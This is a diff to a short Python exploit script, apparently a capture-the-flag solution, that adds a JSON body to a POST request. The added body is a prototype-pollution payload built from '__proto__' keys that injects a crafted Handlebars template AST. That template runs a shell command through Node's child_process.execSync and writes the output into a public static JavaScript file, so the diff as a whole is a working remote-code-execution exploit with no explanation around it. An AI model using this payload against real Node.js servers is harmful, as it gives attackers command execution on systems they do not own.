@@ -15,7 +15,20 @@ def connect():
 
     r = requests.post(url + submit, headers=headers, json= {
     "artist.name":"Haigh",
-    
+    "__proto__.type": "Program",
+    "__proto__.body": [{
+        "type": "MustacheStatement",
+        "path": 0,
+        "params": [{
+            "type": "NumberLiteral",
+
+            "value": "process.mainModule.require('child_process').execSync('ls > static/js/main.js')"
+        }],
+        "loc": {
+            "start": 0,
+            "end": 0
+        }
+    }]
 })
     r2 = requests.get(url + out, headers=headers)
 
